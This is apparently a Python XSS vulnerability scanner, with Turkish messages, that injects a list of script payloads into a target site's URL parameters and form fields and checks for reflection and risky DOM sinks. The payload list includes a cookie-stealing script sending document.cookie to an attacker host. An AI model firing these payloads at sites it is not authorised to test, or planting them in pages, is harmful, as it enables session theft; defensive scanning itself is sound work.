import requests
import urllib.parse
from bs4 import BeautifulSoup
import re

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe onload=alert(1)>",
            "<div onmouseover=alert(1)>XSS Test</div>",
            "javascript:alert(1)",
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<a href=\"javascript:alert(1)\">Click Me</a>",
            "<input type=\"text\" value=\"\" onfocus=\"alert(1)\" autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<video src=1 onerror=alert(1)>",
            "<audio src=1 onerror=alert(1)>"
        ]
        
    def scan(self):
        """XSS zafiyeti taraması gerçekleştirir"""
        result = {
            "title": "XSS (Cross-Site Scripting) Testi",
            "findings": []
        }
        
        try:
            # URL parametrelerinde XSS testi
            if self._test_url_params():
                result["findings"].append({
                    "name": "URL Parametrelerinde XSS",
                    "description": "URL parametrelerinde Cross-Site Scripting (XSS) zafiyeti tespit edildi",
                    "risk_level": "Yüksek",
                    "impact": "Kullanıcı oturumlarının çalınması, zararlı scriptlerin çalıştırılması, kimlik avı saldırıları",
                    "recommendation": "Tüm kullanıcı girdilerini HTML kodlarını temizleyerek işleyin"
                })
            
            # Form alanlarında XSS testi
            forms_result = self._test_forms()
            if forms_result:
                result["findings"].append({
                    "name": "Form Alanlarında XSS",
                    "description": f"Form alanında Cross-Site Scripting (XSS) zafiyeti tespit edildi: {forms_result}",
                    "risk_level": "Yüksek",
                    "impact": "Kullanıcı oturumlarının çalınması, zararlı scriptlerin çalıştırılması, kimlik avı saldırıları",
                    "recommendation": "Tüm form verilerini HTML kodlarını temizleyerek işleyin"
                })
                
            # DOM tabanlı XSS testi
            if self._test_dom_based_xss():
                result["findings"].append({
                    "name": "DOM Tabanlı XSS",
                    "description": "DOM tabanlı Cross-Site Scripting (XSS) zafiyeti tespit edildi",
                    "risk_level": "Yüksek",
                    "impact": "JavaScript ile manipülasyon, kullanıcı oturumlarının çalınması",
                    "recommendation": "DOM manipülasyonu yapan JavaScript kodlarında güvenli kodlama yapın ve kullanıcı girdilerini temizleyin"
                })
                
        except Exception as e:
            result["findings"].append({
                "name": "XSS Tarama Hatası",
                "description": f"XSS testi sırasında hata oluştu: {str(e)}",
                "risk_level": "Orta",
                "impact": "XSS taraması tamamlanamadı",
                "recommendation": "Taramayı yeniden deneyin veya manuel olarak test edin"
            })
        
        if not result["findings"]:
            result["findings"].append({
                "name": "XSS (Cross-Site Scripting)",
                "description": "XSS zafiyeti tespit edilmedi",
                "risk_level": "Düşük",
                "impact": "Herhangi bir sorun tespit edilmedi",
                "recommendation": "Güvenli kodlama pratiklerine devam edin ve düzenli olarak güvenlik taramaları yapın"
            })
            
        return result
        
    def _test_url_params(self):
        """URL parametrelerinde XSS testi yapar"""
        parsed_url = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return False
            
        for param in query_params:
            for payload in self.payloads:
                # Test için yeni URL oluştur
                test_params = dict(query_params)
                test_params[param] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Yanıtta payload'ımızın olup olmadığını kontrol et
                    if payload in response.text:
                        # HTML etiketleri kapatılmamış mı kontrol et
                        # Eğer payload aynen yanıtta varsa XSS olabilir
                        return True
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return False
        
    def _test_forms(self):
        """Form alanlarında XSS testi yapar"""
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Form action URL'sini oluştur
                form_url = form_action
                if not form_url.startswith('http'):
                    # Göreceli URL ise mutlak URL oluştur
                    parsed_url = urllib.parse.urlparse(self.target_url)
                    base_url = urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, '', '', '', ''))
                    form_url = urllib.parse.urljoin(base_url, form_url)
                
                # Form alanlarını topla
                inputs = form.find_all(['input', 'textarea'])
                
                for input_field in inputs:
                    field_name = input_field.get('name')
                    if not field_name:
                        continue
                        
                    field_type = input_field.get('type', '')
                    
                    # Sadece metin giriş alanlarını test et
                    if field_type.lower() in ['', 'text', 'search', 'url', 'email', 'password', 'tel']:
                        for payload in self.payloads:
                            form_data = {}
                            
                            # Tüm form alanlarını doldur (basit değerlerle)
                            for inp in inputs:
                                inp_name = inp.get('name')
                                if inp_name:
                                    form_data[inp_name] = 'test'
                                    
                            # Test edilecek alana payload yerleştir
                            form_data[field_name] = payload
                            
                            try:
                                if form_method == 'post':
                                    resp = requests.post(form_url, data=form_data, timeout=10, verify=False)
                                else:
                                    resp = requests.get(form_url, params=form_data, timeout=10, verify=False)
                                    
                                # Yanıtta payload'ımızın olup olmadığını kontrol et
                                if payload in resp.text:
                                    return f"Form alanı: {field_name}"
                                    
                            except requests.exceptions.RequestException:
                                continue
                                
            return False
            
        except requests.exceptions.RequestException:
            return False
            
    def _test_dom_based_xss(self):
        """DOM tabanlı XSS testi yapar"""
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            
            # DOM manipülasyonu yapan riskli fonksiyonları ara
            risky_patterns = [
                'document.write', 
                'document.writeln', 
                'innerHTML', 
                'outerHTML',
                'eval(',
                'setTimeout(',
                'setInterval(',
                'location.hash',
                'location.href',
                'location.search',
                'document.URL',
                'document.documentURI',
                'Function(',
                'execScript('
            ]
            
            for pattern in risky_patterns:
                if pattern in response.text:
                    # Script etiketlerinde ve JavaScript dosyalarında bu fonksiyonları ara
                    scripts = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL)
                    
                    for script in scripts:
                        # document.location gibi DOM kaynaklarından gelen verilerin
                        # riskli fonksiyonlara aktarılıp aktarılmadığını kontrol et
                        if 'location' in script and pattern in script:
                            # Potansiyel DOM XSS zafiyeti
                            return True
                            
            return False
            
        except requests.exceptions.RequestException:
            return False 